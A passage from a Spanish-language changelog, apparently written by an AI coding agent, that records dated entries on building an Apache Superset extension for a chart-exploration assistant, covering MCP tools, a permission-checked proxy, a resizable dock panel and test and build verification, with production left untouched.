  `ExploreAssistantPanel.test.tsx`), 237 de backend (sin cambios). Los 189
  tests previos siguen pasando sin modificarse, salvo la única aserción
  desactualizada de `exploreHost.test.tsx` (esperaba que "Nueva sesión" NO
  apareciera — ahora aparece a propósito, porque ya hay una conversación
  real que vaciar).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Sin verificación end-to-end en navegador contra el backend real del
  chat — pendiente que el usuario pruebe con un mensaje real una vez
  reiniciado `superset_test.service`.

### 2026-09-24 (69) (Explore: `irex.get_explore_state` no llegaba a `tools/list` — faltaba el paso 6 obligatorio)

Archivos afectados:
- `superset_config_test.py` (raíz del proyecto, `SUPERSET_CONFIG_PATH` de
  `superset_mcp_test.service` — confirmado en
  `.env_superset_mcp_test`)

Cambio realizado: al retomar el trabajo de las entradas 61-68 (hecho por otra
sesión en paralelo sobre este mismo repo), verifiqué el estado real antes de
seguir — `npx tsc --noEmit`, 189 tests de frontend, 237 de backend, todos
correctos, coincidiendo con lo reportado. Pero `irex.get_explore_state`
(entrada 67, `@tool(name="irex.get_explore_state", tags=["irex", "explore",
"chart", "read_only"], ...)`) nunca se agregó a `MCP_TOOL_SEARCH_CONFIG
["always_visible"]` — el paso 6 que CLAUDE.md marca como CRÍTICO y
OBLIGATORIO para cualquier tool nuevo: "Sin este paso el tool se registra
pero NO aparece en tools/list y el LLM no lo ve." Sin este fix, todo el
trabajo de las entradas 66-68 (que depende de que el backend del chat pueda
invocar esta tool) quedaba con la tool invisible en la práctica.

Que cambia o corrige: se agregó
`"extensions.irex.irex-mcp-tools.irex.get_explore_state"` a la lista, mismo
formato que las demás 16 entradas ya presentes. Solo se tocó el config de
TEST (`superset_config_test.py`) — coherente con que este trabajo no se
promovió a producción (confirmado: `extensions/` no tiene este `.supx`,
solo `extensions_test/`). La lista equivalente de producción
(`/home/imercados/.superset/superset_config.py`) queda intacta a propósito.
De paso corrijo un desliz de formato en esta misma entrada anterior (68): el
header `## Registro de cambios` había quedado desplazado debajo de esa
entrada en vez de al principio del archivo — no es un cambio de contenido,
solo la posición del título.

Verificación: `python -m py_compile` sobre `superset_config_test.py` (sin
errores de sintaxis). Pendiente: reiniciar `superset_mcp_test.service` para
que tome el cambio (el usuario ya había reiniciado tras la entrada 68, pero
antes de este fix) y confirmar con `tools/list` que `irex.get_explore_state`
ahora aparece.

### 2026-09-24 (68) (Explore: lectura del chat desde estado persistido)

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAssistantContract.test.ts`
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
- `PLAN_COPILOTO_EXPLORE.md`
- `Registro de cambios.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Cambio realizado: el body v1 del chat identifica dataset y tipo desde el
`form_data` persistido (`id__table`) y usa el `slice_id` superior de la URL,
aunque `form_data.slice_id` esté obsoleto. Permite explicar la configuración
cuando no hay SQL ejecutado. La key y la identidad son pistas que el backend
y el MCP vuelven a verificar; SQL, resultados y `preview` siguen sujetos a
verificación independiente del `query_context` ejecutado. El contrato local
y el plan reflejan el cambio confirmado por el agente del backend a
`state_kind=last_persisted`.

Verificación: 10 pruebas focalizadas; build 7/7 con 189 frontend, 237 backend,
TypeScript estricto y webpack; `.supx` actualizado solo en `extensions_test/`.
Pendiente prueba autenticada extremo a extremo
con el backend de chat y completar el catálogo MCP de controles.

### 2026-09-24 (67) (Explore: primera tool MCP con estado persistido verificado)

Cambio realizado: se implementó `irex.get_explore_state` de solo lectura y
se identificó una incompatibilidad semántica del contrato con el backend de
chat (`last_executed` no se puede probar desde `form_data_key`).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_state_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_explore_state.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_state_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (tras build)

Qué cambia o corrige: la tool lee la key desde la caché bajo identidad MCP,
exige permisos de Explore, Chart y Dataset y el `check_access` nativo al
dataset/gráfico. Deriva `slice_id` del estado cacheado, no del form_data que
puede contener un ID antiguo. Devuelve `is_admin` del servidor y
`state_kind=last_persisted`, sin afirmar que esa configuración se ejecutó.
El backend de chat debe aceptar ese estado para lectura; SQL/preview requieren
prueba separada del `query_context` ejecutado. No se ejecutan consultas ni se
modifican gráficos o datasets.

Verificación: build 7/7 aprobado (188 pruebas frontend, 237 backend,
TypeScript estricto, webpack y paquete de test). Ocho pruebas focalizadas,
Ruff lint/formato y `git diff --check` aprobados. Los hooks `mypy` y Ruff
del pre-commit del core no resuelven el paquete/ejecutable de esta extensión;
Ruff directo pasó. El `.supx` de test contiene la tool y el import de
registro. El usuario reinició `superset_mcp_test.service` a las 13:55; el journal
registró `extensions.irex.irex-mcp-tools.irex.get_explore_state` como tool
protegida a las 13:56. Web test `/health` 200 y MCP de test activo en 5009,
sin errores de arranque. No se invocó la tool con datos de un gráfico:
falta que el backend acepte `last_persisted`. Producción intacta.

### 2026-09-24 (66) (Explore: proxy de test y transporte SSE)

Cambio realizado: con autorización explícita del usuario para el envío de
identidad y estado al backend de chat configurado en test, se conectó la
ruta Explore del proxy y el transporte del contrato v1.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/_assistant_proxy.py`
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/assistant_api.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_assistant_proxy.py`
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreBackendAdapter.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreBackendAdapter.test.ts` (nuevo)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Qué cambia o corrige: la REST `/assistant/explore` exige sesión, rol del chat,
permisos de Explore/Chart/Dataset, acceso real al dataset y CSRF. Reemplaza
Admin y MCP del navegador con valores del servidor, filtra headers y reenvía
solo a `/api/explore-assistant`. El frontend procesa JSON y SSE del contrato
Explore v1 con CSRF; no usa el proxy legacy como fallback. El panel no llama
aún al transporte ni aplica propuestas: `irex.get_explore_state` y la Fase 0
siguen pendientes. Producción intacta.

Verificación: build 7/7 aprobado (188 pruebas frontend, 229 backend,
TypeScript estricto, Ruff lint/formato, webpack y paquete de test). Pruebas
focalizadas cubren denegación RBAC/dataset, suplantación de Admin/MCP, errores
HTTP y SSE. `pre-commit` pasó los hooks disponibles, pero mypy del hook no
resuelve imports de esta extensión y el hook Ruff no tiene ejecutable; Ruff
se ejecutó directamente desde `.venv` y pasó. El intento inicial de reinicio con `sudo -n` falló por contraseña; el usuario
reinició `superset_test.service` después. Validación en vivo en `localhost:9090`:
`/health` 200; `POST /extensions/irex/irex-mcp-tools/assistant/explore`
sin sesión ni CSRF devuelve 400 por token faltante; `GET` a esa ruta devuelve
405; una ruta inexistente devuelve 404. La extensión se registró en el
arranque. No se envió ningún gráfico al backend del chat en esta prueba.
Queda pendiente la prueba autenticada y `irex.get_explore_state`. Producción
intacta.

### 2026-09-24 (65) (Explore: contrato v1 y auditoría RBAC)

Cambio realizado: se preparó el contrato frontend de Explore v1 sin habilitar
transporte ni acciones; se auditó el acceso de lectura en test.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md` (aportado por el usuario)
- `custom-extensions/irex-mcp-tools/frontend/src/contracts/exploreAssistant.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAssistantContract.test.ts` (nuevo)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`
- `Registro de cambios.md`

Qué cambia o corrige: el parser acepta solo respuestas `superset_explore` v1,
valida acciones y aclaraciones, y rechaza acciones mal formadas. El adaptador
arma el body desde la key y el `query_context` fiel; si faltan, falla sin
enviar datos. La metadata de test muestra lectura de Chart/Dataset para
Admin, Alpha, Gamma y Solo PNS; solo los tres primeros tienen `can_explore`.
El rol `acceso chat` no basta por sí solo. Ningún permiso del body se toma como
autorización.

Verificación: build 7/7 aprobado: TypeScript estricto, 182 pruebas
frontend y 223 backend; `git diff --check` limpio. Paquete actualizado
solo en `extensions_test/`. La revisión automática rechazó añadir el proxy
hacia `CHAT_WIDGET_API_URL` por falta de autorización explícita para enviar
identidad y estado del gráfico a ese destino. No se aplicó el cambio
rechazado. Quedan pendientes proxy, tools MCP, pruebas negativas del gate y
validación de extremo a extremo. Producción intacta.

### 2026-09-24 (64) (Explore: adaptador de lectura y encabezado propio)

Cambio realizado: inicio de la Fase 1 del copiloto de Explore, manteniendo
la separación entre el estado persistido y la consulta ejecutada.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/PanelHeader.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreState.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Qué cambia o corrige: el adaptador expone el gráfico leído desde la URL y
su `query_context` fiel como datos distintos, y centraliza los eventos de
URL y de captura. El dock evita una segunda lectura de `form_data` para el
indicador. El encabezado en Explore dice «Asistente de gráficos» y no ofrece
un botón «Limpiar» que aún no tenía efecto. SQL Lab conserva su título y
botón de sesión. No se aplican cambios al gráfico ni se habilita chat.

Verificación: TypeScript estricto y build 7/7 aprobados; 173 pruebas
frontend y 223 backend aprobadas. `pre-commit` pasó en los archivos
afectados (los hooks de frontend del core no cubren esta extensión);
`git diff --check` sin errores. Paquete actualizado solo en
`extensions_test/`; producción intacta. El servicio test requiere reinicio
para cargar esta versión. Fase 1 parcial; Fase 0 pendiente de validación
visual de los demás tipos.

### 2026-09-24 (63) (Explore: usar el último request ejecutado)

Cambio realizado: el panel usa el último `query_context` de una petición
`/api/v1/chart/data` completa y exitosa para el `slice_id` abierto, sin
compararlo con el `form_data` crudo de `form_data_key`.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreQueryCapture.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreQueryCapture.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreState.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Qué cambia o corrige: la entrada 62 comparaba dos representaciones distintas:
la consulta se construye desde controles normalizados y la URL guarda el
estado crudo del editor. En el gráfico 682, `chart.params` y el contexto
almacenado contienen además un `slice_id` antiguo (1187); se conserva la
restricción de no confiar en ese contexto como SQL de la vista actual.
Solo se captura la respuesta 200 de la consulta completa JSON del gráfico
abierto. Los cambios de controles posteriores siguen pendientes hasta que
Superset los ejecute. No hay consultas adicionales ni escritura al gráfico.

Verificación: build 7/7 aprobado (TypeScript estricto, 172 pruebas frontend,
223 backend, webpack y empaquetado); 45 pruebas de Explore, incluida la
selección por gráfico y el rechazo de requests que no son `full`. Paquete
copiado a `extensions_test/`. El usuario reinició `superset_test.service`
a las 13:06 y, tras pulsar «Actualizar gráfico» en el gráfico 682
(`table_v3`), confirmó que el panel muestra «SQL del estado ejecutado
disponible (table_v3).» Validación visual de ese caso aprobada; faltan
otros tipos para cerrar el criterio 2 de la Fase 0. Producción intacta.

### 2026-09-24 (62) (Explore: capturar el query_context ejecutado)

Cambio realizado: el dock observa el `POST /api/v1/chart/data` que Explore ya
hace, sin ejecutar otra consulta ni reconstruir `buildQuery`. Si la petición
responde 200 y su `form_data` coincide con el estado persistido de la URL,
reutiliza el body exacto como `query_context` del estado ejecutado. Al salir
de Explore restaura `fetch` y descarta los contextos en memoria.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreQueryCapture.ts`
  (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreQueryCapture.test.ts`
  (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreState.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Qué cambia o corrige: el estado ejecutado puede mostrar `SQL del estado
ejecutado disponible` aunque `chart.params` difiera por los campos añadidos
por Explore. La comprobación sigue siendo conservadora: cualquier diferencia
real de `form_data`, parámetros URL con valores, respuesta fallida o uso de
la API legacy mantiene el aviso. No se captura SQL de otros sitios ni se
persiste en disco. Aún falta validación visual con gráficos reales y las
funciones de SQL/vista previa posteriores del plan.

Verificación: TypeScript estricto, 44 pruebas de Explore, build 7/7
(171 frontend, 223 backend) y una prueba adicional de consultas múltiples
aprobados. El `.supx` nuevo está en `extensions_test/`; el servicio de test
seguía cargando la versión anterior al comprobarlo a las 11:50. Hace falta
reiniciarlo y validar en navegador con gráficos reales. Producción intacta.

### 2026-09-24 (61) (Explore: corregir diagnóstico falso de cambios sin guardar)

Cambio realizado: al abrir o actualizar un gráfico, el panel ya no interpreta
una diferencia entre el historial de Explore y `chart.params` como prueba de
cambios hechos por el usuario. También invalida lecturas pendientes al cambiar
de gráfico y valida estrictamente el `slice_id` de la URL.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreState.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Qué cambia o corrige: Superset agrega campos y valores por defecto a
`form_data`; en 13 estados reales de la base de test, ninguno coincidía con
`chart.params`, tampoco tras quitar `slice_id`, `dashboards` y `dashboardId`.
El aviso anterior atribuía incorrectamente esa diferencia a cambios sin
guardar. La desigualdad queda como fidelidad no verificada; solo la igualdad
exacta confirma que se puede reutilizar el `query_context` guardado. Se
revoca el cierre del criterio 2 de la entrada 60 hasta obtener el
`query_context` de la ejecución actual. Las respuestas de un gráfico anterior
ya no pueden sobrescribir el estado del gráfico nuevo.

Verificación: `npx tsc --noEmit`, 39 pruebas de Explore, suite completa
(166 frontend, 223 backend) y `build-extension.sh` 7/7 aprobados. Paquete
actualizado solo en `extensions_test/`. `pre-commit` sobre los archivos
corregidos pasó (los hooks específicos de frontend se omitieron por su
configuración de rutas). El reinicio de `superset_test.service`
no se pudo ejecutar porque `sudo -n` requiere contraseña; falta comprobar
el panel en la app de test tras reiniciar el servicio.

### 2026-09-24 (60) (copiloto de Explore: se cierran los criterios de salida 1 y 2 de la Fase 0)

Cambio realizado:
Con el mecanismo de montaje/resize/plegado ya confirmado por el usuario,
se implementa la lógica que faltaba para cerrar los dos criterios de
salida que el propio plan exige antes de dar la Fase 0 por terminada:
detectar de forma confiable si hay que confiar en el estado leído, y de
dónde sale un `query_context` fiel.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts`
  (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/routeObserver.ts`
  (nuevo export `onDidChangeLocation`)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
  (banner de contrato + estado de fidelidad, reemplaza el placeholder)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreState.test.ts`
  (nuevo, 13 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/routeObserver.test.ts`
  (+3 tests, total 12)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
  (+4 tests, total 23)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)
- `PLAN_COPILOTO_EXPLORE.md`

Que cambia o corrige:
- **Criterio de salida 1 (estado visible vs. persistido) — opción (b) del
  plan, implementada tal cual la recomendaba la revisión externa.** El
  panel ahora muestra SIEMPRE, sin excepción, un contrato explícito
  (`UNSAVED_STATE_CONTRACT`): "trabajo sobre el último estado EJECUTADO del
  gráfico [...] si cambiaste controles sin ejecutar, hacelo antes". No se
  intenta detectar "hay ediciones sin ejecutar" inspeccionando el store de
  Redux del host (la opción (a) que el plan mismo advertía como frágil) —
  se declara el límite en vez de fingir que no existe.
- `routeObserver.ts` suma `onDidChangeLocation`: a diferencia de
  `onDidChangeSurface` (que solo dispara al cruzar entre
  explore/sqllab/other), este dispara en CADA cambio de URL — necesario
  para reaccionar a un cambio de `slice_id` o de `form_data_key` sin salir
  de `/explore`, algo que `onDidChangeSurface` nunca iba a notificar por
  diseño.
- **Criterio de salida 2 (`query_context` fiel), decisión final:** se reusa
  el `query_context` GUARDADO del gráfico (`GET /api/v1/chart/<id>`) solo
  cuando el `form_data` actual (leído de `GET /api/v1/explore/form_data/
  <form_data_key>`, comparación estructural, no por referencia) es
  IDÉNTICO al `params` guardado del gráfico. En cualquier otro caso —
  gráfico sin guardar (sin `slice_id`), form_data_key vencida, o cambios
  EJECUTADOS que divergen de lo guardado — SQL/vista previa quedan
  deshabilitados con el motivo explícito, **para cualquier tipo de gráfico,
  nativos y los tres plugins propios por igual**, sin excepción por tipo.
  Se descartan las otras dos vías que evaluaba el plan (ejecutar el
  `buildQuery` del plugin en el navegador; reconstruirlo en el servidor por
  tipo, al estilo `chart_helpers.py` de `master`) por el mismo motivo que
  señaló la revisión externa del plan: reimplementar `buildQuery` por tipo
  es superficie de divergencia que no vale la pena para esta fase.
- Toda fallo de red, HTTP no-2xx, o JSON inválido en cualquiera de los dos
  fetch se trata de forma uniforme como "no puedo confiar en esto" →
  `no-disponible`, nunca se propaga como excepción — postura conservadora
  consistente con el resto del módulo.
- El panel resuelve la fidelidad al montar y se vuelve a resolver
  (debounced 400ms, `RESOLVE_DEBOUNCE_MS`) en cada cambio de URL dentro de
  Explore vía el nuevo `onDidChangeLocation`.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 163 tests de frontend (20 nuevos: 13 en `exploreState.test.ts` + 3 en
  `routeObserver.test.ts` + 4 en `exploreHost.test.tsx`), 223 de backend
  (sin cambios, no se tocó backend).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- **Sin verificación end-to-end en navegador contra gráficos reales** — es
  justamente lo que el criterio de salida 2 del plan pide como prueba
  final ("contra un gráfico real de cada uno de los tres plugins propios")
  y no es posible sin una sesión interactiva. El mecanismo construido acá
  deja el banner de fidelidad VISIBLE en el panel (mensaje "SQL fiel
  disponible"/"SQL/vista previa no disponible: <motivo>") precisamente
  para que esa prueba la haga el usuario en la app real — pendiente.

### 2026-09-24 (59) (copiloto de Explore: botón para plegar/desplegar el dock)

Cambio realizado:
Tras confirmar que el mecanismo de la entrada 58 (dock que reserva espacio
en vez de superponerse) ya funcionaba, el usuario pidió un último detalle:
un botón para ocultar y volver a mostrar el panel.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
  (+5 tests, total 19)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- Botón circular (`‹`/`›`) apoyado sobre el handle de resize, mitad hacia
  el lienzo y mitad hacia el panel — vive FUERA de `#irex-explore-dock` a
  propósito, así el `overflow:hidden` del dock nunca se lo lleva puesto
  cuando el ancho baja a 0: queda visible y clickeable incluso con el panel
  totalmente plegado.
- Un click pliega el dock a `width:0` sin perder el ancho elegido (se
  guarda aparte en `expandedWidth`, no se recalcula el default al volver a
  desplegar); otro click lo restaura exactamente a ese ancho. El panel
  sigue montado (no se desmonta React) — plegar es solo una cuestión de
  ancho, no de destruir y recrear el árbol.
- Con el panel plegado, arrastrar el resizer no hace nada (no tiene sentido
  redimensionar un panel en ancho 0) — `setupResize` ahora recibe un
  `isCollapsed()` que ignora el `mousedown` mientras el panel está plegado.
- Estado persistido en `localStorage` (`irex-explore-dock-collapsed`, clave
  propia) — un usuario que lo pliega lo encuentra plegado la próxima vez
  que entra a Explore, igual que ya pasa con el ancho.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 143 tests de frontend (19 en exploreHost.test.tsx: 5 nuevos de plegado),
  223 de backend (sin cambios).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Sin verificación visual en navegador — pendiente que el usuario reinicie
  `superset_test.service` y confirme que el botón se ve, se puede
  clickear, y recuerda el estado al volver a Explore.

### 2026-09-24 (58) (copiloto de Explore: el fix de la entrada 57 no alcanzaba — el dock seguía superpuesto; se reemplaza por el mecanismo del dock de chat)

Cambio realizado:
El fix de la entrada 57 (`measureReservedTop()`, apoyar el `top` del overlay
debajo de las barras de Superset) resolvió que el dock tapara "Guardar" y la
barra global, pero el usuario reportó con una SEGUNDA captura que el dock
seguía siendo un overlay `position: fixed` superpuesto al lienzo del
gráfico y a los controles de "Añadir los valores de control..." — pidiendo
explícitamente que se incruste reservando espacio real, "similar a como lo
hace el widget del chat", y que se pueda cambiar de tamaño. Correcto: ese
mecanismo ya existe, probado en producción, en el dock del widget de chat
(`custom-src/login/mcp_widget.py`, `setupDock`/`setupDockResize`) — este
cambio lo replica para el dock de Explore en vez de seguir iterando sobre
un overlay.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
  (reescrito — se elimina por completo el mecanismo de overlay de la
  entrada 57: `measureReservedTop`, `useReservedTop`, `position: fixed`)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
  (reescrito — 14 tests, ninguno hereda de la entrada 57)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)
- `PLAN_COPILOTO_EXPLORE.md`

Que cambia o corrige:
- `mount()` ya NO agrega un `<div>` posicionado encima de todo. Envuelve
  `#app` (el root de React de TODA la SPA de Superset, navbar incluida) en
  una fila flex, exactamente como hace `setupDock()` del chat: un
  contenedor `.../main` (`flex:1 1 auto`, `overflow-y:auto`) que recibe
  `#app` como hijo, y el dock como HERMANO con ancho propio — `#app` se
  mueve como unidad (nunca se toca su subárbol, cero riesgo de romper el
  reconciliado de React, mismo criterio ya documentado en el widget de
  chat). El dock reserva espacio; nunca puede tapar nada, sin necesidad de
  medir cuánto ocupa Superset arriba (la pregunta que la entrada 57 sí
  tenía que responder).
- `unmount()` restaura `#app` a su posición original exacta (mismo padre,
  mismo hermano siguiente) y quita el wrapper — no deja rastro fuera de
  Explore. Probado explícitamente: `#app` vuelve entre sus vecinos
  originales, con su contenido intacto (no un clon).
- Ancho ajustable arrastrando un handle entre el lienzo y el dock — mismo
  patrón que `setupDockResize()` del chat: mínimo 380px, máximo 50% del
  ancho de la ventana (recalculado en cada arrastre), ancho por defecto
  `min(460px, 34vw)`, y el ancho elegido se guarda en `localStorage`
  (`irex-explore-dock-width`, clave propia — no choca con la del chat) y se
  reusa en el próximo montaje. El arrastre muta el DOM directamente (no
  pasa por estado de React en cada `mousemove`) por la misma razón que el
  widget de chat: evitar un re-render por frame.
- Interacción con el dock del chat: en `/explore`, "El Don" ya está oculto
  por `mcp_widget.py` (entrada 56), pero su propio wrapper (`.mcp-
  dashboard-dock-wrapper`/`-main`) sigue presente en el DOM para usuarios
  con acceso al chat (solo el panel queda con `display:none`, no el
  wrapper). `mount()` no asume que `#app` cuelga directo de `<body>`: lee
  su padre ACTUAL (`app.parentNode`) en el momento de montar, así que
  envuelve correctamente sea cual sea la estructura que encuentre — probado
  también con `#app` en una posición cualquiera del body (no solo como
  único hijo).
- Eliminado por completo `measureReservedTop()`/`useReservedTop()` (y sus
  tests) de la entrada 57: ya no aplican, el dock nunca comparte espacio
  con nada que haya que medir.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 138 tests de frontend (14 en exploreHost.test.tsx, todos nuevos — 0
  heredados de la entrada 57), 223 de backend (sin cambios). Tests nuevos
  cubren: estructura del wrap (`#app` dentro de `.../main`, dock y resizer
  como hermanos, sin `position: fixed`), restauración exacta de `#app` al
  desmontar, ausencia silenciosa de `#app` (no revienta), arrastre del
  handle con clamp a mínimo/máximo, persistencia en `localStorage` y reuso
  en el siguiente montaje, y que los listeners de `window` (mousemove/
  mouseup) se sueltan al desmontar (arrastrar después ya no hace nada).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Sin verificación visual en navegador — no disponible en esta sesión;
  pendiente que el usuario reinicie `superset_test.service` y confirme que
  el dock ahora reserva espacio en vez de superponerse, y que el resize
  funciona.

### 2026-09-24 (57) (copiloto de Explore: el dock tapaba "Guardar" y el menú de Superset — bug real reportado con capturas)

Cambio realizado:
El usuario reportó con dos capturas de pantalla (una con el dock de la
entrada 56 montado, otra sin él) que el panel spike de `exploreHost.tsx`
tapaba por completo la cabecera propia de Explore ("Guardar", "...") y la
barra global de Superset (tema, idioma, Ajustes): el overlay usaba
`position: fixed; top: 0`, asumiendo que podía empezar en el borde
superior del viewport sin contar con que Superset ya apila ahí sus
propias barras.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
  (+4 tests: `measureReservedTop` y el `top` real del dock montado)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/routeObserver.test.ts`
  (fix de aislamiento entre tests, ver abajo)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- `measureReservedTop()` mide el borde inferior (`getBoundingClientRect().bottom`)
  de las dos barras que Explore apila arriba, con sus propios controles
  alineados al mismo lado derecho que el dock: `#main-menu` (barra global,
  `id` fijo en `Menu.tsx`, presente en TODAS las páginas autenticadas) y
  `.header-with-actions` (cabecera propia de Explore con "Guardar", de
  `PageHeaderWithActions`, un componente COMPARTIDO — no un nombre
  inventado para esta extensión). El dock se apoya en el `Math.max()` de
  ambas (nunca en la más alta: eso seguiría tapando la que sobra).
- `useReservedTop()` recalcula ese valor con el mismo patrón que ya usa
  `usePanelHeight()` en `SqlLabAssistantPanel.tsx` para el mismo problema
  (espacio reservado por un layout del host que esta extensión no
  controla): `ResizeObserver` sobre `document.body` + listener de
  `resize` + un reintento a 300ms para la carrera de montaje entre el
  árbol de React del host y esta raíz independiente.
- **Bug de aislamiento entre tests, encontrado escribiendo el test de este
  fix (no en producción):** `routeObserver.ts` envuelve
  `history.pushState`/`replaceState` una sola vez por proceso — correcto
  en producción, donde el bundle se evalúa una vez. En Jest,
  `jest.resetModules()` crea un módulo nuevo por test, pero
  `window.history` (el objeto real) persiste entre los tests de un mismo
  archivo y `_resetForTests()` solo baja el flag `installed`, sin
  restaurar las funciones nativas: cada test envolvía OTRA capa sobre la
  del test anterior. El nuevo test de este fix, al ser el primero en leer
  `document.getElementById` después de un `pushState`, quedó agarrando un
  `<div id="irex-explore-dock">` **zombi** de un test previo (reactivado
  por su propio `pushState`) en vez del que acababa de montar — de ahí que
  fallara con `top: 0px` incluso con `measureReservedTop()` calculado
  aparte devolviendo 140 correctamente. Fix: ambos archivos de test
  capturan `pushState`/`replaceState` nativos una vez al cargar el
  archivo y los restauran en `beforeEach`, antes de `jest.resetModules()`.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 133 tests de frontend (4 nuevos de este fix + fix de aislamiento en
  otros 2), 223 de backend (sin cambios, no se tocó backend).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Sin verificación visual en navegador — no disponible en esta sesión;
  pendiente que el usuario reinicie `superset_test.service` y confirme
  que "Guardar"/"..." quedan visibles con el dock montado.

### 2026-09-24 (56) (copiloto de Explore: Fase 0 — montaje, tema fuera del árbol de React, tab_id, y por qué el catálogo de controles no se puede compartir)

Cambio realizado:
Arranque de la Fase 0 (spike) de PLAN_COPILOTO_EXPLORE.md: tareas 1, 3, 4,
5 y 6. **La Fase 0 NO queda cerrada** — sus dos criterios de salida
(estado visible vs. persistido; `query_context` fiel) requieren construir
y probar en vivo lógica que es propia de fases posteriores; esta entrada
deja el mecanismo de base (montaje, tema, `tab_id`) y evidencia que
resuelve QUÉ construir, verificada contra la app de test real, no solo
leyendo código.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/routeObserver.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/themeBridge.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/index.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/supersetCoreMock.tsx`
  (`theme.Theme`/`theme.ThemeProvider`, contexto real de React)
